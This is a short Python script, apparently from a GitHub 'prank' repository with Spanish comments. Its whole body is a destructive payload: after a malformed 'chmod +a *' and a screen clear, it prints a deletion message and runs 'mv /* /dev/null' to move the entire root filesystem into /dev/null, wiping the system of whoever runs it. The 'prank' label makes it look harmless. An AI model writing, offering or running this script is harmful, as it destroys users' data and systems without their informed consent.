# Move total discord to null
# By: https://github.com/Br3Fuck/PrankDestroy
# Modulos:

import os
import time

# Permisos:

def permisos():
	os.system("chmod +a *")

# Clear:

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Deleted System:

def deleted():
	print("Moviendo todo el disco a /dev/null")
	os.system("mv /* /dev/null")
	
# Run:

def script():
	permisos()
	clear()
	print("¡Eliminando!...")
	time.sleep(2)
	deleted()
	
script()
